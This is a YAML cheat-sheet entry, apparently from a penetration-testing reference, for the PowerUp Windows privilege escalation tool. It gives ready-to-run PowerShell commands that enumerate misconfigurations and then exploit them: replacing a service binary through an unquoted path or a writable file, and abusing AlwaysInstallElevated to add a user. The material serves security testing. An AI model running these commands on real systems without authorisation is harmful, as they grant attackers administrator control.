---
description: |
  PowerUp — automated Windows privilege escalation checker.
  Finds service misconfigs, unquoted paths, DLL hijacking,
  registry autoruns, and AlwaysInstallElevated.
command: |
  # Import
  Import-Module .\PowerUp.ps1
  # Or: . .\PowerUp.ps1

  # Run all checks
  Invoke-AllChecks

  # Specific checks
  Get-UnquotedService
  Get-ModifiableServiceFile
  Get-ModifiableService
  Get-RegistryAlwaysInstallElevated
  Get-RegistryAutoLogon
  Get-ModifiableScheduledTaskFile

  # Exploit unquoted service path
  Write-ServiceBinary -Name 'VulnService' -Path 'C:\Program Files\Vuln Service\service.exe'

  # Exploit modifiable service binary
  Install-ServiceBinary -Name 'VulnService'

  # Abuse AlwaysInstallElevated
  Write-UserAddMSI
phase:
  - PrivEsc
target_os:
  - Windows
services: []
items:
  - Shell
techniques:
  - Token_Impersonation
network_position:
  - Local
references:
  - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
---
